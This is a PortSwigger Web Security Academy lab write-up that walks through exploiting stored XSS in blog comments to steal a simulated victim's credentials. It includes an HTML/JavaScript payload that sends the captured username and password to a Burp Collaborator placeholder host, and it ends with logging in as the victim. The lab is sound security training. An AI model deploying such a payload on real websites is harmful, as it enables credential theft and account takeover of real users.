# Lab: Exploiting cross-site scripting to capture passwords

{% hint style="warning" %}
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
{% endhint %}

## Lab: Exploiting cross-site scripting to capture passwords

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

ACCESS THE LAB: https://portswigger.net/academy/labs/launch/08d9e37603cfe2ef7cf8a21c19e9fc73e81bb5d992fe2e876f8b6891b1759d43?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-capturing-passwords

### Solution

{% stepper %}
{% step %}
### Prepare a Burp Collaborator payload

1. Using Burp Suite Professional, go to the Collaborator tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
{% endstep %}

{% step %}
### Submit the XSS payload in a comment

Submit the following payload in a blog comment, replacing BURP-COLLABORATOR-SUBDOMAIN with the value you copied from Burp Collaborator:

{% code title="XSS payload" %}
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
{% endcode %}
{% endstep %}

{% step %}
### Poll Collaborator and retrieve credentials

1. Go back to the Collaborator tab, and click "Poll now".
2. You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
3. Note the value of the victim's username and password contained in the POST body.
{% endstep %}

{% step %}
### Log in as the victim

Use the credentials you captured to log in as the victim user.
{% endstep %}
{% endstepper %}

### Alternative solution

You could adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed.

Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

### Community solutions

<details>

<summary>z3nsh3ll — Exploiting Cross-site Scripting to Capture Passwords (No Collaborator) - YouTube</summary>

Photo / channel: https://www.youtube.com/channel/UCnWAPVvXxivIo40QpjEMU1w?embeds\_referring\_euri=https%3A%2F%2Fportswigger.net%2F\&embeds\_referring\_origin=https%3A%2F%2Fportswigger.net

Video: https://www.youtube.com/watch?v=I6TOtXSOZ90

</details>

<details>

<summary>Michael Sommer — Exploiting cross-site scripting to capture passwords (Video solution, Audio) - YouTube</summary>

Video: https://www.youtube.com/watch?v=JqSbrD2gduQ\
Channel: https://www.youtube.com/channel/UCfchiSwWibUyS2USW9NQSWw

</details>

### Further reading

Find XSS vulnerabilities using Burp Suite: https://portswigger.net/burp
